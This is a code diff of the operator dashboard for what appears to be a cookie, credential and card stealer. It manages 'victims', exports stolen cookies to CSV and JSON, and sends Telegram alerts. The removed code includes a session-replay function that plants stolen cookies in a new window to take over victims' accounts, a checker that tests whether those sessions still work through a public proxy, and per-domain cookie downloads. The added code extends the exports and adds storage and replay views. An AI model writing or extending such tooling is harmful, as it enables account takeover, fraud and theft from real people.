-                select.innerHTML = '<option value="">— No domains —</option>';
-                document.getElementById('replayStatus').textContent = 'No cookies stolen yet.';
-                return;
-            }
-
-            let html = '';
-            domains.forEach(domain => {
-                html += `<option value="${domain}">${domain}</option>`;
-            });
-            select.innerHTML = html;
-            document.getElementById('replayStatus').textContent = `${domains.size} domains available`;
-        }
-
-        function replaySelectedDomain() {
-            const select = document.getElementById('replayDomainSelect');
-            const domain = select.value;
-            if (!domain) {
-                showToast('❌ Select a domain', 'error');
-                return;
-            }
-            replaySession(domain);
-        }
-
-        function replaySession(domain) {
-            let cookies = {};
-            let actualDomain = domain;
-            let found = false;
-
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                    actualDomain = entryDomain;
-                    found = true;
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found for ' + domain, 'error');
-                return;
-            }
-
-            if (actualDomain.includes('railway.app') || actualDomain.includes('up.railway') || actualDomain === 'unknown') {
-                for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        actualDomain = ed;
-                        cookies = {};
-                        Object.assign(cookies, entry.cookies || {});
-                        break;
-                    }
+        function togglePasswordVis(key, elementId) {
+            passwordVisibility[key] = !passwordVisibility[key];
+            const el = document.getElementById(elementId);
+            if (el) {
+                if (passwordVisibility[key]) {
+                    el.classList.remove('password-hidden');
+                    el.textContent = el.dataset.originalValue || el.textContent;
+                } else {
+                    el.classList.add('password-hidden');
+                    el.textContent = el.textContent.replace(/[^\s]/g, '•');
                 }
             }
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No valid domain found to replay', 'error');
-                return;
-            }
-
-            const win = window.open('', '_blank');
-            if (!win) {
-                showToast('⚠️ Popup blocked. Allow popups.', 'error');
-                return;
-            }
-
-            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
-
-            win.document.write(`
-                <!DOCTYPE html>
-                <html><head><title>Loading ${cleanDomain}...</title>
-                <style>body{background:#0a0a0a;color:#00ff88;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;font-family:sans-serif;margin:0;}.s{width:36px;height:36px;border:3px solid #1a1a1a;border-top-color:#00ff88;border-radius:50%;animation:s 0.8s linear infinite;}@keyframes s{to{transform:rotate(360deg)}}p{margin-top:16px;color:#666;max-width:300px;text-align:center;word-break:break-all;}</style></head><body>
-                <div class="s"></div>
-                <p>Replaying session for <strong>${cleanDomain}</strong>...</p>
-                <p style="font-size:11px;color:#475569;">${Object.keys(cookies).length} cookies</p>
-                <script>
-                    const cookies = ${JSON.stringify(cookies)};
-                    let count = 0;
-                    Object.entries(cookies).forEach(([name, value]) => {
-                        try { 
-                            document.cookie = name + '=' + value + '; domain=.${cleanDomain}; path=/'; 
-                            count++; 
-                        } catch(e) {}
-                    });
-                    setTimeout(() => window.location.href = 'https://' + '${cleanDomain}', 1500);
-                <\/script>
-            </body></html>
-            `);
-            win.document.close();
-            showToast('▶️ Replay started for ' + cleanDomain, 'success');
-        }
-
-        function replayFromModal() {
-            if (currentModalDomain) replaySession(currentModalDomain);
-        }
-
-        // ============================================================
-        // TEST FUNCTIONS
-        // ============================================================
-
-        async function testSession(domain) {
-            let cookies = {};
-            let actualDomain = domain;
-            let found = false;
-
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                    actualDomain = entryDomain;
-                    found = true;
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && ed === domain) {
-                        Object.assign(cookies, entry.cookies || {});
-                        actualDomain = ed;
-                        found = true;
-                        break;
-                    }
-                }
-            }
-
-            if (Object.keys(cookies).length === 0) {
-                for (const entry of allData) {
-                    const ed = entry.fingerprint?.hostname || entry.domain || '';
-                    if (ed && !ed.includes('railway.app') && !ed.includes('up.railway') && ed !== 'unknown') {
-                        Object.assign(cookies, entry.cookies || {});
-                        actualDomain = ed;
-                        found = true;
-                        break;
-                    }
-                }
-            }
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found for ' + domain, 'error');
-                const resultMsg = document.getElementById('testResultModal');
-                if (resultMsg) {
-                    resultMsg.className = 'test-result show invalid';
-                    resultMsg.textContent = `❌ ${domain} — No cookies found`;
-                }
-                const btn = document.querySelector('.modal .session-actions .test');
-                if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
-                return;
-            }
-
-            const cleanDomain = actualDomain.replace(/^https?:\/\//, '').replace(/\/.*$/, '');
-
-            try {
-                const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://${cleanDomain}`)}`;
-                const response = await fetch(proxyUrl, {
-                    method: 'GET',
-                    signal: AbortSignal.timeout(10000)
-                });
-
-                const resultMsg = document.getElementById('testResultModal');
-                if (resultMsg) {
-                    if (response.ok || response.status < 400) {
-                        resultMsg.className = 'test-result show valid';
-                        resultMsg.textContent = `✅ ${cleanDomain} — Valid (${response.status})`;
-                        showToast(`✅ ${cleanDomain} — Valid`, 'success');
-                    } else {
-                        resultMsg.className = 'test-result show invalid';
-                        resultMsg.textContent = `❌ ${cleanDomain} — Failed (${response.status})`;
-                        showToast(`❌ ${cleanDomain} — Failed (${response.status})`, 'error');
-                    }
-                }
-            } catch (e) {
-                const win = window.open(`https://${cleanDomain}`, '_blank');
-                const resultMsg = document.getElementById('testResultModal');
-                if (resultMsg) {
-                    if (win) {
-                        resultMsg.className = 'test-result show valid';
-                        resultMsg.textContent = `✅ ${cleanDomain} — Opened in new tab (check manually)`;
-                        showToast(`✅ ${cleanDomain} — Opened in new tab`, 'success');
-                    } else {
-                        resultMsg.className = 'test-result show invalid';
-                        resultMsg.textContent = `⚠️ ${cleanDomain} — ${e.message || 'Could not reach domain'}`;
-                        showToast(`⚠️ ${cleanDomain} — ${e.message || 'Could not reach domain'}`, 'error');
-                    }
-                }
-            }
-
-            const btn = document.querySelector('.modal .session-actions .test');
-            if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
-        }
-
-        async function testAllDomains() {
-            if (isTestingAll) return;
-            isTestingAll = true;
-
-            const container = document.getElementById('testerResults');
-            container.innerHTML = '<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ Testing...</div>';
-
-            const domains = new Set();
-            allData.forEach(entry => {
-                const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                domains.add(domain);
-            });
-
-            if (domains.size === 0) {
-                container.innerHTML = '<div style="color:#64748b;font-size:12px;text-align:center;">No domains</div>';
-                isTestingAll = false;
-                return;
-            }
-
-            let results = [];
-            let tested = 0;
-            const total = domains.size;
-
-            for (const domain of domains) {
-                try {
-                    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://${domain}`)}`;
-                    const response = await fetch(proxyUrl, {
-                        signal: AbortSignal.timeout(8000)
-                    });
-                    results.push({ domain, valid: response.ok || response.status < 400, message: `✅ Valid (${response.status})` });
-                } catch (e) {
-                    results.push({ domain, valid: true, message: `⚠️ Check manually` });
-                }
-                tested++;
-                container.innerHTML = `<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ ${tested}/${total}</div>`;
-            }
-
-            let html = '';
-            const validCount = results.filter(r => r.valid).length;
-            html += `<div style="color:#64748b;font-size:11px;margin-bottom:6px;">✅ ${validCount} reachable · ⚠️ ${results.length - validCount} check manually</div>`;
-
-            results.forEach(r => {
-                const color = r.valid ? '#00ff88' : '#ff4444';
-                const icon = r.valid ? '✅' : '⚠️';
-                html += `
-                    <div style="display:flex;justify-content:space-between;align-items:center;background:#0b0f1a;padding:4px 10px;border-radius:4px;border:1px solid ${r.valid ? '#1a2538' : '#2a1a1a'};">
-                        <span style="color:#e2e8f0;font-size:12px;">${r.domain}</span>
-                        <span style="color:${color};font-size:11px;">${icon} ${r.message}</span>
-                    </div>
-                `;
-            });
-
-            container.innerHTML = html;
-            isTestingAll = false;
-            showToast(`✅ ${validCount} reachable, ${results.length - validCount} check manually`, 'success');
-        }
-
-        function testFromModal() {
-            if (currentModalDomain) {
-                const btn = document.querySelector('.modal .session-actions .test');
-                if (btn) {
-                    btn.textContent = '⏳';
-                    btn.style.opacity = '0.6';
-                    btn.disabled = true;
-                }
-                testSession(currentModalDomain);
+            if (el && !el.dataset.originalValue) {
+                el.dataset.originalValue = el.textContent;
             }
         }
 
@@ -2968,16 +3592,14 @@
         }
 
         function exportCSV() {
-            if (allData.length === 0) {
-                showToast('❌ No data', 'error');
-                return;
-            }
-            let rows = ['Domain,Cookie Name,Cookie Value,IP,Country,Time'];
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
+            let rows = ['PC,Domain,Cookie Name,Cookie Value,IP,Country,Time'];
             allData.forEach(entry => {
+                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                 const domain = entry.fingerprint?.hostname || entry.domain || 'unknown';
                 const cookies = entry.cookies || {};
                 Object.entries(cookies).forEach(([name, value]) => {
-                    rows.push(`"${domain}","${name}","${value.replace(/"/g, '""')}","${entry.ip || ''}","${entry.country || ''}","${entry.receivedAt || ''}"`);
+                    rows.push(`"${pc}","${domain}","${name}","${value.replace(/"/g, '""')}","${entry.ip || ''}","${entry.country || ''}","${entry.receivedAt || ''}"`);
                 });
             });
             const csv = rows.join('\n');
@@ -2994,10 +3616,7 @@
         }
 
         function exportRawJSON() {
-            if (allData.length === 0) {
-                showToast('❌ No data', 'error');
-                return;
-            }
+            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
             const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
             const url = URL.createObjectURL(blob);
             const a = document.createElement('a');
@@ -3010,60 +3629,20 @@
             showToast('📥 Raw JSON exported', 'success');
         }
 
-        function downloadDomain(domain) {
-            let cookies = {};
-            allData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain || domain.includes(entryDomain) || entryDomain.includes(domain)) {
-                    Object.assign(cookies, entry.cookies || {});
-                }
-            });
-
-            if (Object.keys(cookies).length === 0) {
-                showToast('❌ No cookies found', 'error');
-                return;
-            }
-
-            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
-            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
-        }
-
         // ============================================================
         // DELETE FUNCTIONS
         // ============================================================
 
         function showDeleteConfirm(uniqueId, domain) {
-            if (!uniqueId || uniqueId === 'unknown') {
-                showToast('❌ Invalid victim ID', 'error');
-                return;
-            }
-            showCustomConfirm(
-                'Move to Trash',
-                `Move victim from ${domain} to trash?`,
-                '🗑️',
-                () => { deleteVictim(uniqueId, domain); },
-                false
-            );
+            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
+            showCustomConfirm('Move to Trash', `Move victim from ${domain} to trash?`, '🗑️', () => { deleteVictim(uniqueId, domain); }, false);
         }
 
         async function deleteVictim(uniqueId, domain) {
-            if (!uniqueId || uniqueId === 'unknown') {
-                showToast('❌ Invalid victim ID', 'error');
-                return;
-            }
-
+            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
             try {
                 const res = await fetch(`/api/delete/${uniqueId}`, { method: 'DELETE' });
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
                 if (data.status === 'ok') {
                     showToast(`🗑️ Victim moved to trash`, 'success');
@@ -3073,34 +3652,19 @@
                 } else {
                     showToast('❌ ' + (data.message || 'Failed'), 'error');
                 }
-            } catch (e) {
-                showToast('❌ Error deleting', 'error');
-            }
+            } catch (e) { showToast('❌ Error deleting', 'error'); }
         }
 
         function showRestoreConfirm(uniqueId, domain) {
-            if (!uniqueId || uniqueId === 'unknown') {
-                showToast('❌ Invalid victim ID', 'error');
-                return;
-            }
-            showCustomConfirm(
-                'Restore Victim',
-                `Restore victim to ${domain}?`,
-                '↩️',
-                () => { restoreVictim(uniqueId, domain); },
-                false
-            );
+            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
+            showCustomConfirm('Restore Victim', `Restore victim to ${domain}?`, '↩️', () => { restoreVictim(uniqueId, domain); }, false);
         }
 
         async function restoreVictim(uniqueId, domain) {
-            if (!uniqueId || uniqueId === 'unknown') {
-                showToast('❌ Invalid victim ID', 'error');
-                return;
-            }
-
+            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
             try {
                 const res = await fetch(`/api/restore/${uniqueId}`, { method: 'POST' });
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
                 if (data.status === 'ok') {
                     showToast(`↩️ Victim restored to ${domain}`, 'success');
@@ -3110,34 +3674,19 @@
                 } else {
                     showToast('❌ ' + (data.message || 'Failed'), 'error');
                 }
-            } catch (e) {
-                showToast('❌ Error restoring', 'error');
-            }
+            } catch (e) { showToast('❌ Error restoring', 'error'); }
         }
 
         function showPermanentDeleteConfirm(uniqueId) {
-            if (!uniqueId || uniqueId === 'unknown') {
-                showToast('❌ Invalid victim ID', 'error');
-                return;
-            }
-            showCustomConfirm(
-                'Permanently Delete',
-                'This cannot be undone.',
-                '⚠️',
-                () => { permanentlyDeleteTrash(uniqueId); },
-                true
-            );
+            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
+            showCustomConfirm('Permanently Delete', 'This cannot be undone.', '⚠️', () => { permanentlyDeleteTrash(uniqueId); }, true);
         }
 
         async function permanentlyDeleteTrash(uniqueId) {
-            if (!uniqueId || uniqueId === 'unknown') {
-                showToast('❌ Invalid victim ID', 'error');
-                return;
-            }
-
+            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
             try {
                 const res = await fetch(`/api/trash/permanent/${uniqueId}`, { method: 'DELETE' });
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
                 if (data.status === 'ok') {
                     showToast(`🗑️ Victim permanently deleted`, 'success');
@@ -3146,90 +3695,17 @@
                 } else {
                     showToast('❌ ' + (data.message || 'Failed'), 'error');
                 }
-            } catch (e) {
-                showToast('❌ Error deleting', 'error');
-            }
-        }
-
-        function showRestoreAllConfirm(domain) {
-            showCustomConfirm(
-                'Restore All',
-                `Restore all victims from ${domain}?`,
-                '↩️',
-                () => { restoreAllDomain(domain); },
-                false
-            );
-        }
-
-        async function restoreAllDomain(domain) {
-            const uniqueIds = [];
-            trashData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain && entry._uniqueId) {
-                    uniqueIds.push(entry._uniqueId);
-                }
-            });
-
-            let success = 0;
-            for (const uid of uniqueIds) {
-                try {
-                    const res = await fetch(`/api/restore/${uid}`, { method: 'POST' });
-                    if (res.status === 401) { window.location.href = '/login.php'; return; }
-                    const data = await res.json();
-                    if (data.status === 'ok') success++;
-                } catch {}
-            }
-            showToast(`↩️ Restored ${success} victims from ${domain}`, 'success');
-            await fetchTrash();
-            await fetchData();
-        }
-
-        function showPermanentDeleteDomainConfirm(domain) {
-            showCustomConfirm(
-                'Delete All',
-                `Permanently delete ALL victims from ${domain}?`,
-                '⚠️',
-                () => { permanentlyDeleteDomain(domain); },
-                true
-            );
-        }
-
-        async function permanentlyDeleteDomain(domain) {
-            const uniqueIds = [];
-            trashData.forEach(entry => {
-                const entryDomain = entry.fingerprint?.hostname || entry.domain || 'unknown';
-                if (entryDomain === domain && entry._uniqueId) {
-                    uniqueIds.push(entry._uniqueId);
-                }
-            });
-
-            let deleted = 0;
-            for (const uid of uniqueIds) {
-                try {
-                    const res = await fetch(`/api/trash/permanent/${uid}`, { method: 'DELETE' });
-                    if (res.status === 401) { window.location.href = '/login.php'; return; }
-                    const data = await res.json();
-                    if (data.status === 'ok') deleted++;
-                } catch {}
-            }
-            showToast(`🗑️ Permanently deleted ${deleted} victims`, 'success');
-            await fetchTrash();
+            } catch (e) { showToast('❌ Error deleting', 'error'); }
         }
 
         function showEmptyTrashConfirm() {
-            showCustomConfirm(
-                'Empty Trash',
-                'This will permanently delete ALL victims in trash.',
-                '⚠️',
-                () => { emptyTrash(); },
-                true
-            );
+            showCustomConfirm('Empty Trash', 'This will permanently delete ALL victims in trash.', '⚠️', () => { emptyTrash(); }, true);
         }
 
         async function emptyTrash() {
             try {
                 const res = await fetch('/api/trash/empty', { method: 'DELETE' });
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
                 if (data.status === 'ok') {
                     showToast(`🗑️ Trash emptied (${data.count} victims)`, 'success');
@@ -3237,31 +3713,21 @@
                 } else {
                     showToast('❌ ' + (data.message || 'Failed'), 'error');
                 }
-            } catch (e) {
-                showToast('❌ Error emptying trash', 'error');
-            }
+            } catch (e) { showToast('❌ Error emptying trash', 'error'); }
         }
 
         function showClearAllConfirm() {
-            showCustomConfirm(
-                'Clear All Data',
-                'This will permanently delete ALL stolen data.',
-                '⚠️',
-                () => { clearData(); },
-                true
-            );
+            showCustomConfirm('Clear All Data', 'This will permanently delete ALL stolen data.', '⚠️', () => { clearData(); }, true);
         }
 
         async function clearData() {
             try {
                 const res = await fetch('/api/clear', { method: 'DELETE' });
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 await fetchData();
                 await fetchTrash();
                 showToast('🗑️ All data cleared', 'success');
-            } catch(e) {
-                showToast('❌ Error clearing data', 'error');
-            }
+            } catch(e) { showToast('❌ Error clearing data', 'error'); }
         }
 
         // ============================================================
@@ -3285,61 +3751,37 @@
             const oldPass = document.getElementById('oldPassword').value;
             const newPass = document.getElementById('newPassword').value;
             const confirmPass = document.getElementById('confirmPassword').value;
-
             document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));
-
             let valid = true;
-
-            if (!oldPass) {
-                document.getElementById('oldPasswordError').textContent = 'Enter current password';
-                document.getElementById('oldPasswordError').classList.add('show');
-                valid = false;
-            }
-
-            if (newPass.length < 4) {
-                document.getElementById('newPasswordError').classList.add('show');
-                valid = false;
-            }
-
-            if (newPass !== confirmPass) {
-                document.getElementById('confirmPasswordError').classList.add('show');
-                valid = false;
-            }
-
+            if (!oldPass) { document.getElementById('oldPasswordError').textContent = 'Enter current password'; document.getElementById('oldPasswordError').classList.add('show'); valid = false; }
+            if (newPass.length < 4) { document.getElementById('newPasswordError').classList.add('show'); valid = false; }
+            if (newPass !== confirmPass) { document.getElementById('confirmPasswordError').classList.add('show'); valid = false; }
             if (!valid) return;
-
             try {
                 const res = await fetch('/api/change-password', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ oldPassword: oldPass, newPassword: newPass })
                 });
-
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
-
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
-
                 if (data.status === 'ok') {
                     showToast('✅ Password changed!', 'success');
                     closeSettings();
-                    setTimeout(() => {
-                        window.location.href = '/password-success.php';
-                    }, 1000);
+                    setTimeout(() => { window.location.href = '/password-success'; }, 1000);
                 } else if (data.message === 'Current password is incorrect') {
                     document.getElementById('oldPasswordError').textContent = 'Current password is incorrect';
                     document.getElementById('oldPasswordError').classList.add('show');
                 } else {
                     showToast('❌ ' + (data.message || 'Failed'), 'error');
                 }
-            } catch (e) {
-                showToast('❌ Error changing password', 'error');
-            }
+            } catch (e) { showToast('❌ Error changing password', 'error'); }
         }
 
         async function loadTelegramSettings() {
             try {
                 const res = await fetch('/api/config/telegram');
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
                 if (data) {
                     document.getElementById('telegramToken').value = data.botToken || '';
@@ -3353,33 +3795,22 @@
             const botToken = document.getElementById('telegramToken').value.trim();
             const chatId = document.getElementById('telegramChatId').value.trim();
             const notifications = document.getElementById('telegramNotifications').checked;
-
-            if (!botToken || !chatId) {
-                showToast('❌ Bot token and chat ID required', 'error');
-                return;
-            }
-
-            if (!botToken.match(/^\d+:[A-Za-z0-9_-]+$/)) {
-                showToast('❌ Invalid token format', 'error');
-                return;
-            }
-
+            if (!botToken || !chatId) { showToast('❌ Bot token and chat ID required', 'error'); return; }
+            if (!botToken.match(/^\d+:[A-Za-z0-9_-]+$/)) { showToast('❌ Invalid token format', 'error'); return; }
             try {
                 const res = await fetch('/api/config/telegram', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ botToken, chatId, notifications })
                 });
-                if (res.status === 401) { window.location.href = '/login.php'; return; }
+                if (res.status === 401) { window.location.href = '/login'; return; }
                 const data = await res.json();
                 if (data.status === 'ok') {
                     showToast('✅ Telegram settings updated!', 'success');
                 } else {
                     showToast('❌ ' + data.message, 'error');
                 }
-            } catch (e) {
-                showToast('❌ Failed to update', 'error');
-            }
+            } catch (e) { showToast('❌ Failed to update', 'error'); }
         }
 
         // ============================================================
@@ -3396,7 +3827,7 @@
 
         function executeLogout() {
             hideLogoutConfirm();
-            window.location.href = '/api/logout';
+            window.location.href = '/logout';
         }
 
         // ============================================================
@@ -3406,7 +3837,6 @@
         document.addEventListener('DOMContentLoaded', function() {
             checkSession().then((valid) => {
                 if (!valid) return;
-
                 const navItems = document.querySelectorAll('.sidebar .nav-item[data-view]');
                 navItems.forEach(item => {
                     item.addEventListener('click', function() {
@@ -3414,7 +3844,6 @@
                         if (view) switchView(view);
                     });
                 });
-
                 fetchData();
                 fetchTrash();
                 setInterval(() => {
@@ -3424,9 +3853,9 @@
                     else if (currentView === 'victims') renderVictimsView();
                     else if (currentView === 'creds') renderCredsView();
                     else if (currentView === 'cards') renderCardsView();
-                    else if (currentView === 'replay') populateReplayDomains();
+                    else if (currentView === 'storage') renderStorageView();
+                    else if (currentView === 'replay') renderReplayView();
                 }, 10000);
-
                 document.getElementById('trashCount').textContent = trashData.length;
             });
         });
